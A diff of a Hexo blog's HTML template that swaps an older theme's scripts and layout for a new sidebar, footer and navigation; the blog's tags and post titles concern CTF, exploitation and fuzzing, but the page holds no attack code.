+      <a data-url="http://gumeng.fun/2017/10/30/20171030-Pyhon执行cmd命令的若干方式/" data-id="cl3ej0qtt000vq4vkz7nzxdkk" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Coding/">Coding</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Exploit/">Exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工控协议/">工控协议</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/工控协议/逆向工程/">逆向工程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/模糊测试/">模糊测试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exp/">Exp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Filename/">Filename</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap-Pwn/">Heap Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nmap/">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/privilge/">privilge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础概念类/">基础概念类</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Exp/" style="font-size: 10px;">Exp</a> <a href="/tags/Exploit/" style="font-size: 20px;">Exploit</a> <a href="/tags/Filename/" style="font-size: 10px;">Filename</a> <a href="/tags/Heap-Pwn/" style="font-size: 10px;">Heap Pwn</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Pwn/" style="font-size: 10px;">Pwn</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/privilge/" style="font-size: 10px;">privilge</a> <a href="/tags/基础概念类/" style="font-size: 10px;">基础概念类</a> <a href="/tags/漏洞利用/" style="font-size: 15px;">漏洞利用</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/05/14/20220516-初探wavpack测试crashes文件分析/">初探wavpack测试crashes样本分析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/07/20220507-UMAS协议初探/">施耐德umas工控协议初探</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/07/20220413-fuzz技术最新进展与展望/">Fuzzing技术最新进展与展望</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/04/20200804-ELF 文件结构/">ELF 文件结构初初级解析</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/04/20200804-外国ctf网站/">外国ctf学习网站集锦（未完待续）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 拾荒者CD<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
 </footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
 
-<!-- jQuery -->
-<script src="/js/jquery.min.js"></script>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 
-<!-- Bootstrap Core JavaScript -->
-<script src="/js/bootstrap.min.js"></script>
 
-<!-- Custom Theme JavaScript -->
-<script src="/js/blog.js"></script>
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
 
-<!-- async load function -->
-<script>
-    function async(u, c) {
-      var d = document, t = 'script',
-          o = d.createElement(t),
-          s = d.getElementsByTagName(t)[0];
-      o.src = u;
-      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
-      s.parentNode.insertBefore(o, s);
-    }
-</script>
 
-<!-- jquery.tagcloud.js -->
-<script>
-    // only load tagcloud.js in tag.html
-    if($('#tag_cloud').length !== 0){
-        async("http://gumeng.fun/js/jquery.tagcloud.js",function(){
-            $.fn.tagcloud.defaults = {
-                //size: {start: 1, end: 1, unit: 'em'},
-                color: {start: '#bbbbee', end: '#0085a1'},
-            };
-            $('#tag_cloud a').tagcloud();
-        })
-    }
-</script>
-
-<!--fastClick.js -->
-<script>
-    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
-        var $nav = document.querySelector("nav");
-        if($nav) FastClick.attach($nav);
-    })
-</script>
+<script src="/js/script.js"></script>
 
 
 
-<!-- Google Analytics -->
-
-
-
-<!-- Baidu Tongji -->
-
-
-<!-- swiftype -->
-<script type="text/javascript">
-  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
-  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
-  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
-  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
-
-  _st('install','','2.0.0');
-</script>
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-<!--wechat title img-->
-<img class="wechat-title-img" src="">
+  </div>
 </body>
-
 </html>
